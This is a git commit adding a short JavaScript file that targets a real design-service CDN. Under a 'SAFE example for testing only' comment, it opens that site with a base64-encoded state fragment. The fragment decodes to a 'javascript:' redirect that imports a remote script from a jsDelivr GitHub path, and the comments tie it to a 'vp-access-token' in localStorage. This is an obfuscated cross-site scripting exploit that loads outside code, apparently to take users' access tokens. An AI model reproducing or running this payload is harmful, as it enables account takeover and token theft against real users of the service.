d02d72e92f537b485c10dbda9d552f498a9448ed
input <crackermrx96@gmail.com>
2026-05-10 17:44:53 +0100

    Add vista_open.js for testing localStorage access

---
+++ vista_open.js
@@ -0,0 +1,3 @@
+// SAFE example for testing only — do NOT use to target others.
+// Prompt appears only if localStorage contains "vp-access-token".
+open('https://cdn.albelli.design.vpsvc.com/#state=eyJyZWRpcmVjdFVybCI6ImphdmFzY3JpcHQ6aW1wb3J0KCdodHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvZ2gvbXJ4MXcxL2FAbWFpbi9sYXN0X3Zpc3RhLmpzJykifQ==','_blank');close()
